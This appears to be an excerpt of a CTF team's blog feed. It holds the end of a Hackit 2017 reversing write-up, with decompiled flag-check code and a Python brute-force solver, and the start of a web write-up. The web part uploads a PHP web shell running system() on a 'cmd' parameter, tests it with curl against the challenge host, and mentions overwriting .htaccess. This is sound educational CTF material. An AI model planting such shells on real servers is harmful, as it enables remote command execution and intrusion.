class="line">  <span class="built_in">memset</span>(String, <span class="number">0</span>, <span class="number">0x50</span>ui64);</div><div class="line">  v7 = <span class="number">0</span>;</div><div class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="number">0x28</span>ui64);</div><div class="line">  v5 = <span class="number">0</span>;</div><div class="line">  v9 = <span class="number">0</span>;</div><div class="line">  Input(<span class="string">L"Enter the flag: "</span>, String, <span class="number">42</span>i64);</div><div class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</div><div class="line">  &#123;</div><div class="line">    v2 = i;</div><div class="line">    <span class="keyword">if</span> ( v2 &gt;= StrLen(String) )</div><div class="line">      <span class="keyword">break</span>;</div><div class="line">    v4[i] = String[i];</div><div class="line">  &#125;</div><div class="line">  algo((__int64)v4);</div><div class="line">  (**(<span class="keyword">void</span> (__fastcall ***)(_QWORD, _QWORD))(v11 + <span class="number">48</span>))(*(_QWORD *)(v11 + <span class="number">48</span>), <span class="number">0</span>i64);</div><div class="line">  (*(<span class="keyword">void</span> (__fastcall **)(<span class="keyword">signed</span> __int64, <span class="keyword">signed</span> __int64, <span class="keyword">char</span> *))(*(_QWORD *)(v11 + <span class="number">96</span>) + <span class="number">96</span>i64))(</div><div class="line">    <span class="number">1</span>i64,</div><div class="line">    *(_QWORD *)(v11 + <span class="number">48</span>) + <span class="number">16</span>i64,</div><div class="line">    &amp;v8);</div><div class="line">  <span class="keyword">return</span> <span class="number">0</span>i64;</div><div class="line">&#125;</div><div class="line"></div><div class="line">UINTN __<span class="function">fastcall <span class="title">algo</span><span class="params">(__int64 a1)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  UINTN result; <span class="comment">// rax@17</span></div><div class="line">  <span class="keyword">int</span> v2[<span class="number">40</span>]; <span class="comment">// [sp+20h] [bp-60h]@11</span></div><div class="line">  <span class="keyword">int</span> v3[<span class="number">20</span>]; <span class="comment">// [sp+C0h] [bp+40h]@5</span></div><div class="line">  <span class="keyword">int</span> v4[<span class="number">23</span>]; <span class="comment">// [sp+110h] [bp+90h]@2</span></div><div class="line">  <span class="keyword">int</span> m; <span class="comment">// [sp+16Ch] [bp+ECh]@13</span></div><div class="line">  <span class="keyword">int</span> l; <span class="comment">// [sp+170h] [bp+F0h]@10</span></div><div class="line">  <span class="keyword">int</span> k; <span class="comment">// [sp+174h] [bp+F4h]@7</span></div><div class="line">  <span class="keyword">int</span> j; <span class="comment">// [sp+178h] [bp+F8h]@4</span></div><div class="line">  <span class="keyword">int</span> i; <span class="comment">// [sp+17Ch] [bp+FCh]@1</span></div><div class="line"></div><div class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">19</span>; ++i )</div><div class="line">    v4[i] = *(_BYTE *)(i + a1);</div><div class="line">  <span class="keyword">for</span> ( j = <span class="number">20</span>; j &lt;= <span class="number">39</span>; ++j )</div><div class="line">    v3[j - <span class="number">20</span>] = *(_BYTE *)(j + a1);</div><div class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">19</span>; ++k )</div><div class="line">  &#123;</div><div class="line">    v4[k] = (((((v4[k] ^ <span class="number">0xC</span>) + <span class="number">6</span>) ^ <span class="number">0xD</span>) + <span class="number">7</span>) ^ <span class="number">0xE</span>) + <span class="number">8</span>;</div><div class="line">    v3[k] = (((((v3[k] ^ <span class="number">0xF</span>) + <span class="number">9</span>) ^ <span class="number">0x10</span>) + <span class="number">10</span>) ^ <span class="number">0x11</span>) + <span class="number">11</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">for</span> ( l = <span class="number">0</span>; l &lt;= <span class="number">19</span>; ++l )</div><div class="line">    v2[l] = v4[l];</div><div class="line">  <span class="keyword">for</span> ( m = <span class="number">20</span>; m &lt;= <span class="number">39</span>; ++m )</div><div class="line">    v2[m] = v3[m - <span class="number">20</span>];</div><div class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="built_in">memcmp</span>((__int64)v2, (__int64)&amp;correct, <span class="number">160</span>) )</div><div class="line">    result = Print(<span class="string">L"\nWrong\n"</span>);</div><div class="line">  <span class="keyword">else</span></div><div class="line">    result = Print(<span class="string">L"\nCorrect\n"</span>);</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>By reading this c code above we can clearly understand what is going on. the program itself reads from the stdout the flag and then encrypts a bunch of bytes with some xor operations and other stupid simple manipulations, since we know the ciphertext (we can get it from IDA) just double click on “correct” symbol from the main function and you will see its value in the global variables:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div></pre></td><td class="code"><pre><div class="line">.data:0000000070946000                 public correct</div><div class="line">.data:0000000070946000 correct         db  68h ; h             ; DATA XREF: algo+18Eo</div><div class="line">.data:0000000070946001                 db    0</div><div class="line">.data:0000000070946002                 db    0</div><div class="line">.data:0000000070946003                 db    0</div><div class="line">.data:0000000070946004                 db  3Ch ; &lt;</div><div class="line">.data:0000000070946005                 db    0</div><div class="line">.data:0000000070946006                 db    0</div><div class="line">.data:0000000070946007                 db    0</div><div class="line">.data:0000000070946008                 db  79h ; y</div><div class="line">.data:0000000070946009                 db    0</div><div class="line">.data:000000007094600A                 db    0</div><div class="line">.data:000000007094600B                 db    0</div><div class="line">.data:000000007094600C                 db  71h ; q</div><div class="line">.data:000000007094600D                 db    0</div><div class="line">.data:000000007094600E                 db    0</div><div class="line">.data:000000007094600F                 db    0</div><div class="line">.data:0000000070946010                 db  63h ; c</div><div class="line">.data:0000000070946011                 db    0</div><div class="line">.data:0000000070946012                 db    0</div><div class="line">.data:0000000070946013                 db    0</div><div class="line">.data:0000000070946014                 db  7Ch ; |</div><div class="line">.data:0000000070946015                 db    0</div><div class="line">.data:0000000070946016                 db    0</div><div class="line">.data:0000000070946017                 db    0</div><div class="line">.data:0000000070946018                 db  81h ; ü</div><div class="line">.data:0000000070946019                 db    0</div><div class="line">.data:000000007094601A                 db    0</div><div class="line">.data:000000007094601B                 db    0</div><div class="line">.data:000000007094601C                 db  92h ; Æ</div><div class="line">.data:000000007094601D                 db    0</div><div class="line">.data:000000007094601E                 db    0</div><div class="line">.data:000000007094601F                 db    0</div><div class="line">.data:0000000070946020                 db  92h ; Æ</div><div class="line">.data:0000000070946021                 db    0</div><div class="line">.data:0000000070946022                 db    0</div><div class="line">.data:0000000070946023                 db    0</div><div class="line">.data:0000000070946024                 db  65h ; e</div><div class="line">.data:0000000070946025                 db    0</div><div class="line">.data:0000000070946026                 db    0</div><div class="line">.data:0000000070946027                 db    0</div><div class="line">.data:0000000070946028                 db  65h ; e</div><div class="line">.data:0000000070946029                 db    0</div><div class="line">.data:000000007094602A                 db    0</div><div class="line">.data:000000007094602B                 db    0</div><div class="line">.data:000000007094602C                 db  93h ; ô</div><div class="line">.data:000000007094602D                 db    0</div><div class="line">.data:000000007094602E                 db    0</div><div class="line">.data:000000007094602F                 db    0</div><div class="line">.data:0000000070946030                 db  92h ; Æ</div><div class="line">.data:0000000070946031                 db    0</div><div class="line">.data:0000000070946032                 db    0</div><div class="line">.data:0000000070946033                 db    0</div><div class="line">.data:0000000070946034                 db  49h ; I</div><div class="line">.data:0000000070946035                 db    0</div><div class="line">.data:0000000070946036                 db    0</div><div class="line">.data:0000000070946037                 db    0</div><div class="line">.data:0000000070946038                 db  79h ; y</div><div class="line">.data:0000000070946039                 db    0</div><div class="line">.data:000000007094603A                 db    0</div><div class="line">.data:000000007094603B                 db    0</div><div class="line">.data:000000007094603C                 db  92h ; Æ</div><div class="line">.data:000000007094603D                 db    0</div><div class="line">.data:000000007094603E                 db    0</div><div class="line">.data:000000007094603F                 db    0</div><div class="line">.data:0000000070946040                 db  38h ; 8</div><div class="line">.data:0000000070946041                 db    0</div><div class="line">.data:0000000070946042                 db    0</div><div class="line">.data:0000000070946043                 db    0</div><div class="line">.data:0000000070946044                 db  6Ch ; l</div><div class="line">.data:0000000070946045                 db    0</div><div class="line">.data:0000000070946046                 db    0</div><div class="line">.data:0000000070946047                 db    0</div><div class="line">.data:0000000070946048                 db  3Ch ; &lt;</div><div class="line">.data:0000000070946049                 db    0</div><div class="line">.data:000000007094604A                 db    0</div><div class="line">.data:000000007094604B                 db    0</div><div class="line">.data:000000007094604C                 db  6Fh ; o</div><div class="line">.data:000000007094604D                 db    0</div><div class="line">.data:000000007094604E                 db    0</div><div class="line">.data:000000007094604F                 db    0</div><div class="line">.data:0000000070946050                 db  7Bh ; &#123;</div><div class="line">.data:0000000070946051                 db    0</div><div class="line">.data:0000000070946052                 db    0</div><div class="line">.data:0000000070946053                 db    0</div><div class="line">.data:0000000070946054                 db  87h ; ç</div><div class="line">.data:0000000070946055                 db    0</div><div class="line">.data:0000000070946056                 db    0</div><div class="line">.data:0000000070946057                 db    0</div><div class="line">.data:0000000070946058                 db  58h ; X</div><div class="line">.data:0000000070946059                 db    0</div><div class="line">.data:000000007094605A                 db    0</div><div class="line">.data:000000007094605B                 db    0</div><div class="line">.data:000000007094605C                 db  55h ; U</div><div class="line">.data:000000007094605D                 db    0</div><div class="line">.data:000000007094605E                 db    0</div><div class="line">.data:000000007094605F                 db    0</div><div class="line">.data:0000000070946060                 db  89h ; ë</div><div class="line">.data:0000000070946061                 db    0</div><div class="line">.data:0000000070946062                 db    0</div><div class="line">.data:0000000070946063                 db    0</div><div class="line">.data:0000000070946064                 db  5Ah ; Z</div><div class="line">.data:0000000070946065                 db    0</div><div class="line">.data:0000000070946066                 db    0</div><div class="line">.data:0000000070946067                 db    0</div><div class="line">.data:0000000070946068                 db  59h ; Y</div><div class="line">.data:0000000070946069                 db    0</div><div class="line">.data:000000007094606A                 db    0</div><div class="line">.data:000000007094606B                 db    0</div><div class="line">.data:000000007094606C                 db  7Eh ; ~</div><div class="line">.data:000000007094606D                 db    0</div><div class="line">.data:000000007094606E                 db    0</div><div class="line">.data:000000007094606F                 db    0</div><div class="line">.data:0000000070946070                 db  7Eh ; ~</div><div class="line">.data:0000000070946071                 db    0</div><div class="line">.data:0000000070946072                 db    0</div><div class="line">.data:0000000070946073                 db    0</div><div class="line">.data:0000000070946074                 db  6Bh ; k</div><div class="line">.data:0000000070946075                 db    0</div><div class="line">.data:0000000070946076                 db    0</div><div class="line">.data:0000000070946077                 db    0</div><div class="line">.data:0000000070946078                 db  87h ; ç</div><div class="line">.data:0000000070946079                 db    0</div><div class="line">.data:000000007094607A                 db    0</div><div class="line">.data:000000007094607B                 db    0</div><div class="line">.data:000000007094607C                 db  6Ch ; l</div><div class="line">.data:000000007094607D                 db    0</div><div class="line">.data:000000007094607E                 db    0</div><div class="line">.data:000000007094607F                 db    0</div><div class="line">.data:0000000070946080                 db  57h ; W</div><div class="line">.data:0000000070946081                 db    0</div><div class="line">.data:0000000070946082                 db    0</div><div class="line">.data:0000000070946083                 db    0</div><div class="line">.data:0000000070946084                 db  6Ch ; l</div><div class="line">.data:0000000070946085                 db    0</div><div class="line">.data:0000000070946086                 db    0</div><div class="line">.data:0000000070946087                 db    0</div><div class="line">.data:0000000070946088                 db  6Bh ; k</div><div class="line">.data:0000000070946089                 db    0</div><div class="line">.data:000000007094608A                 db    0</div><div class="line">.data:000000007094608B                 db    0</div><div class="line">.data:000000007094608C                 db  58h ; X</div><div class="line">.data:000000007094608D                 db    0</div><div class="line">.data:000000007094608E                 db    0</div><div class="line">.data:000000007094608F                 db    0</div><div class="line">.data:0000000070946090                 db  59h ; Y</div><div class="line">.data:0000000070946091                 db    0</div><div class="line">.data:0000000070946092                 db    0</div><div class="line">.data:0000000070946093                 db    0</div><div class="line">.data:0000000070946094                 db  5Ah ; Z</div><div class="line">.data:0000000070946095                 db    0</div><div class="line">.data:0000000070946096                 db    0</div><div class="line">.data:0000000070946097                 db    0</div><div class="line">.data:0000000070946098                 db  5Ah ; Z</div><div class="line">.data:0000000070946099                 db    0</div><div class="line">.data:000000007094609A                 db    0</div><div class="line">.data:000000007094609B                 db    0</div><div class="line">.data:000000007094609C                 db  6Fh ; o</div><div class="line">.data:000000007094609D                 db    0</div><div class="line">.data:000000007094609E                 db    0</div><div class="line">.data:000000007094609F                 db    0</div></pre></td></tr></table></figure>
<p>Now parsing it with sublime-txt(very fast and easy to do it), than we put into a hex byte characters string in python… why not put the characters since ida actually shows some of them? Because this is a ciphertext and some characters may be unprintable or those which can be printed may require unicode and we all know how boring is to deal with unicode in python …  so I always use hex bytes.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">correct = <span class="string">"\x68\x3C\x79\x71\x63\x7C\x81\x92\x92\x65\x65\x93\x92\x49\x79\x92\x38\x6C\x3C\x6F\x7B\x87\x58\x55\x89\x5A\x59\x7E\x7E\x6B\x87\x6C\x57\x6C\x6B\x58\x59\x5A\x5A\x6F"</span></div></pre></td></tr></table></figure>
<p>Now I have an idea instead of trying to make a function that reverses those two functions why not bruteforce byte by byte, replicate the pseudo c code in python and when we get the final ciphertext equal to the “correct” variable we end the calculations and print the original string? seems like a cool plan! so we just rewrite that c code into python and then we add some loops to bruteforce the rest of the flag!!!</p>
<p>We don’t even need to bruteforce from the range from 0x00 to the 0xff we can just use printable characters since the flag will only have those! and more we already have the beginning and the end of the flag which is “h4ck1t{“ and “}”.</p>
<p>Here is the final payload:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</div><div class="line"><span class="keyword">import</span> difflib</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> string</div><div class="line"><span class="keyword">from</span> difflib <span class="keyword">import</span> Differ</div><div class="line"></div><div class="line"></div><div class="line">correct = <span class="string">"\x68\x3C\x79\x71\x63\x7C\x81\x92\x92\x65\x65\x93\x92\x49\x79\x92\x38\x6C\x3C\x6F\x7B\x87\x58\x55\x89\x5A\x59\x7E\x7E\x6B\x87\x6C\x57\x6C\x6B\x58\x59\x5A\x5A\x6F"</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">algo</span><span class="params">(a1, offset)</span>:</span></div><div class="line">  result = <span class="string">""</span></div><div class="line">  v2 = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</div><div class="line">  v3 = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</div><div class="line">  v4 = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</div><div class="line">  </div><div class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">20</span>):</div><div class="line">    v4[i] = ord(a1[i])</div><div class="line"></div><div class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">20</span>,<span class="number">40</span>):</div><div class="line">    v3[j<span class="number">-20</span>]= ord(a1[j]) </div><div class="line"></div><div class="line">  <span class="keyword">for</span> k <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">20</span>):</div><div class="line">    v4[k] = (((((v4[k] ^ <span class="number">0xC</span>) + <span class="number">6</span>) ^ <span class="number">0xD</span>) + <span class="number">7</span>) ^ <span class="number">0xE</span>) + <span class="number">8</span></div><div class="line">    v3[k] = (((((v3[k] ^ <span class="number">0xF</span>) + <span class="number">9</span>) ^ <span class="number">0x10</span>) + <span class="number">10</span>) ^ <span class="number">0x11</span>) + <span class="number">11</span></div><div class="line">  <span class="keyword">for</span> l <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">20</span>):</div><div class="line">    v2[l] = v4[l]</div><div class="line">  <span class="keyword">for</span> m <span class="keyword">in</span> xrange(<span class="number">20</span>,<span class="number">40</span>):</div><div class="line">    v2[m] = v3[m<span class="number">-20</span>]</div><div class="line">  flag = <span class="string">''</span>.join([chr(x) <span class="keyword">for</span> x <span class="keyword">in</span> v2])</div><div class="line">  <span class="comment">#print(flag)</span></div><div class="line">  <span class="comment">#print(correct)</span></div><div class="line">  </div><div class="line">  <span class="keyword">if</span>(flag != correct):</div><div class="line">    result = <span class="string">"Wrong"</span></div><div class="line">  <span class="keyword">else</span>:</div><div class="line">    result = <span class="string">"Correct"</span></div><div class="line">  <span class="keyword">return</span> result, flag[offset] == correct[offset]</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">  v2 = <span class="number">0</span></div><div class="line">  v4 = <span class="string">""</span></div><div class="line">  flag = <span class="string">""</span> <span class="comment"># 0x20</span></div><div class="line">  v6 = <span class="string">''</span></div><div class="line">  v7 = <span class="number">0</span></div><div class="line">  i = <span class="number">0</span></div><div class="line">  result = <span class="string">'Wrong'</span></div><div class="line">  offset = <span class="number">7</span></div><div class="line">  flag = <span class="string">"h4ck1t&#123;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#125;"</span></div><div class="line">  diff = <span class="keyword">False</span></div><div class="line">  <span class="comment">#print (string.printable)</span></div><div class="line">  <span class="comment">#exit(0)</span></div><div class="line">  <span class="keyword">while</span> result == <span class="string">'Wrong'</span>:</div><div class="line">    <span class="comment">#print offset</span></div><div class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> string.printable:  </div><div class="line">      v4 = <span class="string">""</span></div><div class="line">      flag = [x <span class="keyword">for</span> x <span class="keyword">in</span> flag]</div><div class="line">      <span class="comment">#print offset</span></div><div class="line">      flag[offset] = y</div><div class="line">      <span class="comment">#print('\r'+''.join(flag),end='')</span></div><div class="line">      i = <span class="number">0</span></div><div class="line">      <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">        v2 = i</div><div class="line">        <span class="keyword">if</span> (v2 &gt;= len(flag)):</div><div class="line">          <span class="keyword">break</span></div><div class="line">        v4 += flag[i]</div><div class="line">        i +=<span class="number">1</span></div><div class="line">      <span class="comment">#print (v4,offset)</span></div><div class="line">      result, diff = algo(v4, offset)</div><div class="line">      <span class="keyword">if</span> result == <span class="string">'Correct'</span>:</div><div class="line">        <span class="keyword">break</span></div><div class="line">      <span class="comment">#print (diff,y)</span></div><div class="line">      <span class="comment">#print len(list(diff))</span></div><div class="line">      <span class="keyword">if</span> diff:</div><div class="line">        diff = <span class="keyword">False</span></div><div class="line">        offset += <span class="number">1</span></div><div class="line">        <span class="keyword">break</span></div><div class="line">  print(<span class="string">''</span>.join(flag), result)</div><div class="line">main()</div></pre></td></tr></table></figure></p>
<p>Easy isn’t it? running it we get the flag!:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ python rev200.py</div><div class="line">h4ck1t&#123;ff77af3cf8d4e1e67c4300aeb5ba6344&#125; Correct</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;rev200&lt;br&gt;&lt;br&gt;Description: You haxor, come on you little sciddie… debug me, eh? You fucking little lamer… You fuckin’ come o
    
    </summary>
    
      <category term="Reverse" scheme="https://teamrocketist.github.io/categories/Reverse/"/>
    
    
      <category term="bruteforce" scheme="https://teamrocketist.github.io/tags/bruteforce/"/>
    
      <category term="encryption" scheme="https://teamrocketist.github.io/tags/encryption/"/>
    
      <category term="byte2byte" scheme="https://teamrocketist.github.io/tags/byte2byte/"/>
    
  </entry>
  
  <entry>
    <title>[Web] Hackit 2017 - V1rus3pidem1c 100</title>
    <link href="https://teamrocketist.github.io/2017/08/27/Web-Hackit-2017-V1rus3pidem1c-100/"/>
    <id>https://teamrocketist.github.io/2017/08/27/Web-Hackit-2017-V1rus3pidem1c-100/</id>
    <published>2017-08-27T14:42:12.000Z</published>
    <updated>2017-08-27T20:18:33.098Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>V1rus3pidem1c<br>web100<br><br>Wasted<br><br>16<br><br>Description: Hackers created an automated site for virus attacks on the Government. You must find and catch them all!<br><br>Attachment: (none)<br><br>Webpage: <a href="http://tasks.ctf.com.ua:13372" target="_blank" rel="external">http://tasks.ctf.com.ua:13372</a><br>Hint: (none)<br></blockquote>

<p>After interacting a little bit with the page we can start taking some notes about the website:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">GET parameter &quot;Country&quot; (Possible attacks like SQLi, LFI or even bash injection).</div><div class="line">File Upload form (By uploading a PHP Script).  </div><div class="line">The uploaded files appear to be uploaded into uploads folder.</div></pre></td></tr></table></figure></p>
<p>Lets try uploading a php:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">&lt;pre&gt;<span class="keyword">if</span>($_GET[<span class="string">'cmd'</span>])&#123;system($_GET[<span class="string">'cmd'</span>]);&#125;&lt;/pre&gt;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>Running some curl commands to check the status code of the file we are about to upload:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ curl --write-out <span class="string">'%&#123;http_code&#125;'</span> --silent --output /dev/null <span class="string">'http://tasks.ctf.com.ua:13372/uploads/dnjefwh43jfh342fnewjfjndewefnu27fd.php'</span></div><div class="line">404</div></pre></td></tr></table></figure>
<p>We got a 404 (not found) which is normal we still didn’t upload our php file so lets do it:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ curl --write-out <span class="string">'%&#123;http_code&#125;'</span> --silent --output /dev/null <span class="string">'http://tasks.ctf.com.ua:13372/index.php?country=Germany'</span> -F <span class="string">"fileToUpload=@/home/teamrocketist/D/H/dnjefwh43jfh342fnewjfjndewefnu27fd.php"</span></div><div class="line">200</div></pre></td></tr></table></figure>
<p>Nice we got an 200 (OK) response! lets see if see if this is good news:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">$ curl --write-out <span class="string">'%&#123;http_code&#125;'</span> --silent --output /dev/null <span class="string">'http://tasks.ctf.com.ua:13372/uploads/dnjefwh43jfh342fnewjfjndewefnu27fd.php'</span></div><div class="line">200</div><div class="line">$ curl <span class="string">'http://tasks.ctf.com.ua:13372/uploads/dnjefwh43jfh342fnewjfjndewefnu27fd.php?cmd=ls'</span></div><div class="line">&lt;pre&gt;</div><div class="line">&lt;?php</div><div class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">'cmd'</span>]) &#123;</div><div class="line">  system(<span class="variable">$_GET</span>[<span class="string">'cmd'</span>]);</div><div class="line">  &#125;</div><div class="line">?&gt;</div><div class="line">&lt;/pre&gt;</div></pre></td></tr></table></figure>
<p>We can see we have some good and bad news we uploaded a php file with success! but our php file isn’t executing our php code and why this is happening? The admin must have configured in the apache configuration files to not run php in this specific upload folder(uploads) or it has a .htaccess inside it blocking it.  </p>
<p>Actually you could solve this challenge very easily if you uploaded a .htaccess with your own rules overwriting the original .htaccess but this wasn’t the intentional solution, after a while the admins fixed this and protected the .htaccess file so it couldn’t get overwritten, but I believe some other teams managed to solve this challenge like this.  </p>
<p>But continuing with the intentional solution, lets try to get what’s left from the notes we took before maybe we can try some sql injection?  </p>
